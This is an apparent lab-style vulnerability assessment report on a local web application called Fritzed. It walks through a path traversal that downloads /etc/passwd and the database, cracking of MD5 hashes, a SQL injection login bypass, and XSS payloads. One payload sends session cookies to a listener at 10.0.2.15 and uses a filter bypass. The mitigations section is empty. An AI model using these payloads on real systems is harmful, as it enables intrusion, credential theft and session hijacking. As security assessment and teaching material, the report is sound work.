# Fritzed Web Application Vulnerability Assessment


## Objectives

Fritzed is a newly acquired asset that includes the source code to a web application. The company was recently acquired by a competitor following a massive data breach. Fritzed had a reputation for insecure development practices, and Management would like to have a sense of how bad it is.

Below you will find the full report of the few critical vulnerabilities discovered during the assessment. The report ends with a list of proposed mitigations.

The executive report can be found ![here]


## Table of Contents

1. Manual Reconnaissance
2. Critical Vulnerabilities
  * Path Traversal
  * Cryptographic Failures
  * Injection (Blind SQL Injection)
  * Injection (Cross-Site-Scripting)
3. Proposed Mitigations



### Manual Reconnaissance: 

First, I start with scanning the web application with `dirb` to quickly identify additional hidden pages, which can contain low hanging fruits vulnerabilities or valuable information that I can use to speed up my vulnerability assessment:

![dirb_scan_results]


Following the `dirb` scan, I noticed a very interesting finding, the `robots.txt` file, which is the robots exclusion standard, and it is used to communicate with web crawlers and other web robots to inform them about which areas of the website should not be processed/scanned:

![robots_secret_page]

When visiting the page we are presented with the following message:

![secret_page]

This is interesting. If we can access the database which contains the passwords, we might be able to crack them easily.

Next, I decide to visit the `Documentation` tab and explore the different links. Upon clicking on the first link `HELP` and then `RESOURCES.MD`, I notice the change in the web application's URL and how the request is made to locate and fetch the file I requested.

![path_raversal_1]


## Critical Vulnerabilities


### Path Traversal

I decided to test the web application for path traversal using the well-known `dot dot slash` method. After many attempts, I finally reached the root directory of the webserver using the following payload:

```bash
http://localhost:8888/?page=documentation&path=../../../../../../../../../../../../../../../../
```

If you are familiar with how linux works and how to navigate the CLI, you will notice that each `..` entry moves one directory until it reaches the root directory.

Below, we can see the root directory displayed on the web browser:

![root_directory_displayed]


Next, I navigate to `etc/passwd` but I am not allowed to view the file:


![etc_passwd_not_allowed_to_read]


Since I cannot read the file from the browser, I decided to look for a way to download it instead. By simply modifying the url parameters I was able to craft a payload to download the database file. Below is the payload I used to download it:


```bash
http://localhost:8888/download.php?file=../../../../../../../../../../../../../../../../etc/passwd
```

Below, the `etc/passwd` file:


![etc_passwd_file]

Now that I have a working payload to download files from the webserver without needing to be authenticated, I created a second payload to download the database from the webserver.`/var/www/` being the default root folder of web servers, I decided to browse its content and found the database file `db` at `/var/www/database/db`. I used the following payload to download it:


```bash
http://localhost:8888/download.php?file=../../../../../../../../../../../../../../../../var/www/database/db
```

![database_downloaded]


### Cryptographic Failures


We can see that the database type is listed on the download window prompt, we know which utility to use to open and browse its content: `SQLite`

Using the following command, I start the `SQLite browser` utility to explore the database:

```bash
sqlitebrowser
```

![sqlitebrowser_1]


In the `Browse Data` tab, we can see 5 tables. One table is more interesting than the others: `fritzed_users`

We find 2 users: `admin` and `user`, with their emails and password hashes:

![sqlitebrowser_2]

Their password hashes seem to be md5 hashed. We previously accessed a page letting us know that the passwords were using a weak password hashing algorithm. I decided to use the `CrackStation` website to quickly crack them:


![db_admin_cracked_password.png]

![db_user_cracked_password.png]


### Injection (Blind SQL Injection)


Blind SQL injection techniques are used to bypass authentication. My next target is the login section of the web application where I will test my payload to identify a potential SQL injection vulnerability.

Most login forms that are connected to a database of users are often built in a way that the web application isn't interested in the content of the username and password but more whether the two values make a pair in the database. Following this logic, when you enter username `Jack` and password `SuperJack123` for example, the web application will ask the database if this one has a user `Jack` with the password `SuperJack123`. At this point, the database will reply with either yes or no (which means true or false). If it is true, the user is granted access, if false, access is denied.

A simple way to test for a SQL injection is to create a database query that replies with a `yes/true` all the time:


 ```sql
 ' OR '1'='1' --
 ```

I try the payload in the username field first, and on my first attempt, logged in as `admin`


![SQLi_login_as_admin_1.png]

![SQLi_login_as_admin_2.png]

### Injection (Cross-Site-Scripting)

Continuing my manual testing, I decide to test for XSS at the URL `http://localhost:8888/?page=`, I start with a basic payload that will create a pop-up window with the message `TEST` to evaluate the response from the web application:


JavaScript payload:

```java
<script>alert('TEST');</script>
````


![testing_XSS_payloads_response_404.png]


Next, I opened the developer tool to look at the source code to get a better idea about how my payload was processed and why the server returned a 404 response code:

 ![testing_XSS_payloads_source_code_detail]

 We can see that my malicious payload was inserted inside the HTML `body` tag. We need to find a way to escape the `body` tag first. To do so, we need to use `"` to close the `class` argument and add `>` to close and escape the tag. Using the following updated payload, I was able to exploit the XSS vulnerability:

 ```java
 "><script>alert('TEST');</script>
 ```


![testing_XSS_payloads_successful.png]

Below, we can see that we successfully escaped the body tag:

![testing_XSS_payloads_successful_source_code.png]


Many attacks can be conducted using XSS vulnerability. A common attack is to steal session cookies to hijack a logged-in user's session. I crafted the below payload to capture session cookies when a user clicks on my malicious link:

```java
"><script>fetch('http://10.0.2.15:47555?cookie=' + btoa(document.cookie) );</script>
```

Next I set up a listening server using Netcat:

```bash
nc -nlvp 47555
```

Next, I test my payload directly in the web browser, unfortunately, my listening server did not capture any request. Upon inspection of the source code, I noticed that the `+` is filtered out of the payload. 

![source_code_filtering_out_character]


This is common with some form of input validation, but a minor issue for us. To bypass the filtering, I decide to use the `Decoder` section of Burp Suite to "URL encode" the character `+` turning it into `%2b`:

![url_encode_plus_sign_burp]


New payload:

```java
"><script>fetch('http://10.0.2.15:47555?cookie=' %2b btoa(document.cookie) );</script>
```

Running the new payload, my listening server captured a request with the session cookie:

![cookie_captured]


This type of attack can be turned into a Stored XSS, where the payload is sent via a ticket on the support page of a website. Once the customer support agent clicks on the ticket to open it, the payload would trigger, capture and send the agent's session cookie to the malicious actor who can then hijack the agent's session.

## Proposed Mitigations


#### Path Traversal



#### Cryptographic Failures



#### Injection (Blind SQL Injection)



#### Injection (Cross-Site-Scripting)
